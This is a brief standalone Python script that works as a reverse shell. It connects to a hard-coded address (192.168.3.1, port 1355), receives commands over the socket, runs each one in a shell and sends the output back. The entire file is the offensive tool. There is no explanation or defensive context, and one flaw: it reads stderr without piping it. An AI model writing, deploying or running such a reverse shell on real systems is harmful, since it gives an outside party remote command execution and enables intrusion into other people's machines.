#!/usr/bin/python
import socket
import subprocess

ip = '192.168.3.1'
port= 1355

#create a new socket

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# create connection

sock.connect((ip,port))
#Connect
sock.send('Connected')
while True:
        data = sock.recv(1024)
        process = subprocess.Popen(data, shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE)
        process_data= process.stdout.read() + process.stderr.read()

        sock.send(process_data)

sock.close()
